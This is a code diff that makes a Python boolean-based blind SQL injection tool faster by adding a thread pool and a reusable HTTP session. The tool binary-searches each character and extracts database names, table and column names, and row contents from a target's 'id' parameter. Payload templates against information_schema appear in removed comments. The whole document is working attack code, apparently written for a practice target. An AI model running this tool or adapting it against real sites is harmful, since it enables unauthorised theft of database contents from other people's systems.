@@ -1,7 +1,11 @@
 import requests
 import time
 import random
+
+
 from sql_dicts import bool_inject
+from concurrent.futures import ThreadPoolExecutor
+
 
 chars = list(range(32, 127))
 
@@ -39,11 +43,14 @@ class Data:
 
 
 class Bool_BlindInjector:
-    def __init__(self, sign, url, cookies=None):
+    def __init__(self, sign, url, cookies=None,workers=5):
         self.sign = sign
         self.url = url
         self.cookies = cookies
+        self.workers = min(10,workers)
+        self.session = requests.Session()
         self.db = Databases()
+
 
     def get_db_type(self):
         """获取数据库类型"""
@@ -52,8 +59,6 @@ class Bool_BlindInjector:
 
     def get_db_info(self):
         """获取数据库信息"""
-
-
         # 获取数据库名长度
         init_str = bool_inject[self.db.db_type]['db_len']
         length = self.get_base_info_optimized(init_str)
@@ -62,13 +67,9 @@ class Bool_BlindInjector:
         # 获取数据库名字
         name = ''
         if self.db.db_len > 0:
-            for i in range(1, self.db.db_len + 1):
-                info_type = bool_inject[self.db.db_type]['db_name']
-
-                x = self.get_char_optimized(i, info_type)
-                name += x
-                print(x, end='')
-            print()
+            info_type = bool_inject[self.db.db_type]['db_name']
+            name = self.multi_thread(length,info_type)
+            print(name)
         self.db.db_name = name
         self.db.db_info[self.db.db_name] = self.db.db_len
 
@@ -92,12 +93,8 @@ class Bool_BlindInjector:
         tab_name = []
         for j in range(0,count):
             name = ''
-            for i in range(1,length[j]+1):
-                # bool_inject[self.db.db_type]['tab_name']=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1))={}#
-                info_type = bool_inject[self.db.db_type]['tab_name'].replace('{}',str(j),1)
-                x = self.get_char_optimized(i,info_type)
-                name += x
-                print(x,end='')
+            info_type = bool_inject[self.db.db_type]['tab_name'].replace('{}', str(j), 1)
+            name = self.multi_thread(length[j],info_type)
             print()
             print(f'[*]表{j+1}的名是{name}')
             tab_name.append(name)
@@ -134,13 +131,8 @@ class Bool_BlindInjector:
         col_name = []
         for col_count in range(0,count):
             name = ''
-            for z in range(1,length[col_count]+1):
-                # init_str = f"(select column_name from information_schema.columns where table_name='{tab_name}' limit {col_count},1)"
-                # 1'and ascii(substr((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1))={}#
-                info_type = bool_inject[self.db.db_type]['col_name'].replace('{}',tab_name,1).replace('{}', str(col_count), 1)
-                x = self.get_char_optimized(z,info_type)
-                name += x
-                print(x,end='')
+            info_type = bool_inject[self.db.db_type]['col_name'].replace('{}', tab_name, 1).replace('{}',str(col_count), 1)
+            name = self.multi_thread(length[col_count],info_type)
             print()
             print(f'[*]表{tab_name}的列{col_count + 1}为{name}')
             col_name.append(name)
@@ -186,17 +178,10 @@ class Bool_BlindInjector:
             data_list = []
             for row in range(0, count):  # 遍历数据行
                 data = ''
+                info_type = bool_inject[self.db.db_type]['data'].replace('{}', col.column_name, 1).replace('{}',tab_name,1).replace('{}', str(row), 1)
                 if not data_len_dict[col.column_name][row] :
                     continue
-                for i in range(1, data_len_dict[col.column_name][row]+1):  # 遍历列数据的每一个字符
-                    # init_str = f'(select {col.column_name} from {tab_name} limit {row},1)'
-
-                    # 1' and ascii(substr((select {} from {} limit {},1),{},1))={}#
-                    # info_type = bool_inject[self.db.db_type]['data'].format(col.column_name,tab_name,row)
-                    info_type = bool_inject[self.db.db_type]['data'].replace('{}',col.column_name,1).replace('{}', tab_name, 1).replace('{}',str(row),1)
-
-                    x = self.get_char_optimized(i,info_type)
-                    data += x
+                data = self.multi_thread(data_len_dict[col.column_name][row],info_type)
                 print()
                 print(f'[*]表{tab_name}的列{col.column_name}的第{row + 1}行数据是{data}')
                 data_list.append(data)
@@ -230,8 +215,33 @@ class Bool_BlindInjector:
         # 可以添加功能 在最大的low和high中还没有找到怎么办 未实现
         return None
 
-    def get_char_optimized(self, position, target_expression):
-        """二分查找名字和内容"""
+    def multi_thread(self, length, target_expression):
+        info = [i + 1 for i in range(length)]
+        # 使用字典存储结果，key为position
+        result_dict = {}
+
+        with ThreadPoolExecutor(max_workers=self.workers) as executor:
+            # 提交任务
+            futures = {executor.submit(
+                self.get_char_optimized_with_dict,
+                position,
+                target_expression,
+                result_dict
+            ): position for position in info}
+
+            # 等待所有任务完成
+            for future in futures:
+                future.result()  # 等待任务完成
+
+        # 将字典按position顺序转换为列表
+        result = ''
+        for i in range(length):
+            result += result_dict.get(i + 1)
+        return result
+
+
+    def get_char_optimized_with_dict(self, position, target_expression, result_dict):
+        """二分查找并将结果存放到字典"""
         low, high = 0, len(chars) - 1
 
         while low <= high:
@@ -239,21 +249,22 @@ class Bool_BlindInjector:
             mid_char = chars[mid]
 
             # 构造payload
-            init_str = target_expression.format(position,mid_char)
+            init_str = target_expression.format(position, mid_char)
 
-            if self.send_and_check(init_str,"GET"):
-                return chr(mid_char)
+            if self.send_and_check(init_str, "GET"):
+                result_dict[position] = chr(mid_char)  # 存储到字典
+                return
 
             # 判断大小关系
-            gt_str = init_str[::-1].replace('=','>',1)[::-1]
+            gt_str = init_str[::-1].replace('=', '>', 1)[::-1]
 
-
-            if self.send_and_check(gt_str,'GET'):
+            if self.send_and_check(gt_str, 'GET'):
                 low = mid + 1
             else:
                 high = mid - 1
 
-        return None
+        result_dict[position] = None  # 如果没有找到
+
 
     def send_and_check(self, init_str,method=None):
         """检查请求函数"""
@@ -263,11 +274,11 @@ class Bool_BlindInjector:
             'id': init_str,
             'Submit':'Submit'
         }
-        # time.sleep(random)
+        # time.sleep(random.uniform(0.1,0.3))
         if self.cookies :
-            response = requests.get(url=self.url, params=query_str,cookies=cookies) if method else requests.post(url=self.url,data=query_str,cookies=cookies)
+            response = self.session.get(url=self.url, params=query_str,cookies=cookies) if method else self.session.post(url=self.url,data=query_str,cookies=cookies)
         else:
-            response = requests.get(url=self.url, params=query_str) if method else requests.post(url=self.url,data=query_str)
+            response = self.session.get(url=self.url, params=query_str) if method else self.session.post(url=self.url,data=query_str)
         if self.sign in response.text:
             return True
 
@@ -292,6 +303,7 @@ class Bool_BlindInjector:
 
                 print("开始获取数据库数据信息...")
                 bool_injector.get_data_info(table_obj)
+
             end_time = time.time()
             consume = end_time - start_time
             print(f'[*]盲注成功,共耗时{consume:.2f}')
@@ -308,5 +320,7 @@ if __name__ == '__main__':
     response = requests.get(url=url,params=params,cookies=cookies)
     sign = 'exists'
 
-    bool_injector = Bool_BlindInjector(sign,url,cookies)
+    bool_injector = Bool_BlindInjector(sign,url,cookies,5)
     bool_injector.run()
+
+
